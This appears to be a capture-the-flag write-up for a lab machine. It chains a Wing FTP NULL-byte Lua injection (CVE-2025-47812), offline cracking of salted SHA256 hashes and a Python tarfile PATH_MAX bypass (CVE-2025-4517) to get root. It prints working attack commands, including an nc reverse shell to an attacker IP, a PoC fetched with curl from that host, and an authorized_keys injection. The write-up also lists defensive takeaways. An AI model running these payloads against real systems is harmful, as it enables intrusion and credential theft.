Section 02

Recon & Enumeration

01
Port Scan & Vhost Discovery
nmap · Apache · Wing FTP Free Edition

Only two ports are open: SSH and HTTP. The corporate site at wingdata.htb is a static file-sharing platform page, with a Client Portal link in the navigation pointing to ftp.wingdata.htb. The Server response header on this vhost immediately fingerprints the FTP software and edition. Version 7.4.3 is confirmed vulnerable to CVE-2025-47812.

bash
nmap -sC -sV -T4 --min-rate=1000 -p- 10.129.222.51

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7
80/tcp open  http    Apache httpd 2.4.66

echo "10.129.222.51 wingdata.htb ftp.wingdata.htb" >> /etc/hosts

# Version fingerprint from response header
curl -sI http://ftp.wingdata.htb/
Server: Wing FTP Server(Free Edition)
# Version: 7.4.3 (confirmed from config files post-exploit)
✕
CVE-2025-47812: Wing FTP Server versions prior to 7.4.4 are vulnerable to unauthenticated RCE via NULL byte Lua injection. The username parameter in the login request is processed by a C-level function that truncates at NULL, while session creation uses the full unsanitised input — injecting arbitrary Lua code into the session file.
Section 03

Foothold — CVE-2025-47812

02
NULL Byte Lua Injection → Reverse Shell
EDB-52347 · anonymous session · mkfifo shell

The vulnerability injects Lua code into the session file via the username POST parameter using a NULL byte (%00) to terminate the C-level username check, followed by Lua statements. When the authenticated endpoint /dir.html is subsequently accessed with the injected session cookie, the embedded Lua executes as the Wing FTP process. Two practical constraints apply during exploitation: the & character breaks the POST body parsing, so all commands must avoid it; and the anonymous account has a session connection limit requiring manual cleanup of stale /opt/wftpserver/session/*.lua files between attempts.

bash — verify RCE
searchsploit wing ftp 7.4
Wing FTP Server 7.4.3 - Unauthenticated RCE  EDB-52347

python3 52347.py -u http://ftp.wingdata.htb -c "id" -v
uid=1000(wingftp) gid=1000(wingftp) groups=1000(wingftp),24(cdrom)...
bash — mkfifo reverse shell (no & character)
# Listener
nc -lnvp 4444

# Payload: mkfifo avoids & — cmd uses | and ; instead
cmd = 'rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh|nc 10.10.14.33 4444 >/tmp/f'

# Inject NULL + Lua into username, then trigger /dir.html with session cookie
payload = 'username=anonymous%00]]%0dlocal+h+%3d+io.popen("{cmd}")%0d...--&password='

connect to [10.10.14.33] from (UNKNOWN) [10.129.222.51] 39934
$ id
uid=1000(wingftp) gid=1000(wingftp) groups=1000(wingftp)
⚠
Session Limit: The anonymous account has a connection limit. Each exploit call creates a persistent Lua session file. After a few calls the account locks with "too many users". Manually clean stale sessions: rm -f /opt/wftpserver/session/*.lua, or wait 60–180 seconds for expiry.
Section 04

Lateral Movement — SHA256 Hash Crack

03
Extract Wing FTP User Hashes from XML Config
/opt/wftpserver/Data · SHA256($pass + "WingFTP") · hashcat -m 1410

Wing FTP stores all user accounts as individual XML files under /opt/wftpserver/Data/, readable by the wingftp service account. The domain settings XML reveals the password scheme: SHA-256 with a static salt of WingFTP appended to the plaintext password — hashcat mode 1410 (sha256($pass.$salt)). All user hashes are extracted and submitted for offline cracking.

Section 05

Privilege Escalation — CVE-2025-4517

05
Sudo Backup Script Analysis
sudo -l · restore_backup_clients.py · filter="data" · writable backups dir

wacky can run a Python backup restoration script as root with no password and a wildcard argument. The script extracts a user-controlled tar file using tarfile.extractall(filter="data") — intended as a safe extraction mode. Crucially, the /opt/backup_clients/backups/ directory is writable by wacky, meaning the tar archive itself is attacker-controlled.

bash — sudo enumeration
sudo -l
User wacky may run the following commands on wingdata:
    (root) NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *

# Backups directory is writable by wacky
ls -la /opt/backup_clients/
drwxrwx--- root wacky  backups/     ← wacky can write here
drwxr-x--- root wacky  restored_backups/
python — restore_backup_clients.py (key section)
# Script runs as root via sudo
# backup_path: user-supplied filename in writable backups/ dir
# staging_dir: user-supplied restore tag

with tarfile.open(backup_path, "r") as tar:
    tar.extractall(path=staging_dir, filter="data")  # ← CVE-2025-4517 target

# filter="data" is supposed to block symlinks and dangerous paths
# but PATH_MAX overflow bypasses os.path.realpath() on Python < 3.13.2
◈
Why filter="data" isn't safe here: This system runs Python 3.12.3. CVE-2025-4517 affects Python 3.8.0–3.13.1. When os.path.realpath() encounters a path exceeding PATH_MAX (4096 bytes), it silently stops resolving symlinks and falls back to string manipulation — returning a misleadingly "safe" path that doesn't match what the kernel will actually resolve during file creation.
06
CVE-2025-4517 — PATH_MAX Overflow Bypass
realpath() overflow · symlink chain · authorized_keys injection

The exploit creates a malicious tar archive exploiting the PATH_MAX (4096-byte) limit in os.path.realpath(). Sixteen levels of deeply nested directories with 247-character names push the total path beyond 4096 bytes. Single-character symlinks at each level point to the long directories for path shortcutting. An escape symlink traverses back 16 levels — realpath() overflows and fails to resolve this correctly, returning a path that appears to stay within the staging directory. The Linux kernel resolves the actual symlink target correctly, writing files to /root/.ssh/.

bash — deploy PoC and trigger
# Transfer PoC and SSH public key to target
curl -s http://10.10.14.33:8888/cve_2025_4517.py -o /tmp/cve_2025_4517.py
curl -s http://10.10.14.33:8888/mykey.pub -o /tmp/mykey.pub

# Run as wacky — creates malicious tar and deploys to backups/
python3 /tmp/cve_2025_4517.py -k /tmp/mykey.pub
[*] Creating exploit tar...
[+] Exploit tar created: /tmp/cve_2025_4517_exploit.tar
[*] Deploying to: /opt/backup_clients/backups/backup_9999.tar
[+] Exploit deployed successfully

# Trigger extraction as root via sudo backup script
sudo /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py \
  -b backup_9999.tar -r restore_pwn9999

[+] Extraction completed in /opt/backup_clients/restored_backups/restore_pwn9999
# realpath() was fooled — key actually written to /root/.ssh/authorized_keys
◈
How the PATH_MAX Overflow Works: os.path.realpath() builds the resolved path character by character. When the running total exceeds 4096 bytes, it silently stops resolving symlinks and returns whatever has been built so far via string concatenation. This creates a TOCTOU-like discrepancy: Python's security check sees /staging/dir/..., while the kernel resolves the symlink chain to /root/.ssh/authorized_keys.

key takeaways
01 // NULL BYTE HANDLING
CVE-2025-47812 — C vs Lua String Boundary
Wing FTP's C-level authentication truncates the username at NULL, while the session file creation uses the full unsanitised string. This discrepancy enables Lua code injection that executes when the session is loaded. Any application mixing C string semantics (NULL-terminated) with higher-level language strings in security-sensitive paths is a potential injection vector.
02 // CONFIG FILE SECRETS
Wing FTP Plaintext XML Credential Store
Wing FTP stores user password hashes in plaintext XML files readable by the service account. Any process-level compromise immediately yields all user credentials for offline cracking. Service account file permissions should be tightly scoped, and credential stores should be encrypted at rest with keys held separately from the data they protect.
03 // STATIC SALT WEAKNESS
SHA256 with a Global Static Salt
Using the same static salt (WingFTP) for every user defeats the purpose of salting — which is to make precomputed rainbow tables and batch cracking harder. Per-user random salts would require cracking each hash individually. The static salt here means all hashes can be cracked in a single hashcat session against rockyou.txt.
04 // TARFILE FILTER LIMITS
CVE-2025-4517 — filter="data" Is Not Enough
Python's filter="data" was designed to prevent symlink attacks in tar archives. CVE-2025-4517 shows it is bypassable via PATH_MAX overflow in os.path.realpath(). Applications on Python < 3.13.2 handling untrusted tar files must implement additional out-of-band path validation, or upgrade to a patched Python version.
05 // REALPATH SILENT FAILURE
os.path.realpath() Falls Back on PATH_MAX
When a path exceeds 4096 bytes during resolution, os.path.realpath() silently stops resolving symlinks and returns a string-concatenated result. This creates a TOCTOU-like gap: the security check validates a synthetic path, while the kernel resolves the real one. Silent failure modes in security-critical functions are dangerous — always check return values and validate resolved paths are within expected boundaries.
06 // SUDO WRITABLE INPUTS
Never Allow Sudo Scripts to Read Attacker-Writable Files
The backup script ran as root but read from a directory writable by the invoking user. This is equivalent to allowing the user to supply arbitrary root-executed code. Sudo rules that process files should ensure input directories are only writable by root, or implement cryptographic verification (checksums signed by root) before processing.
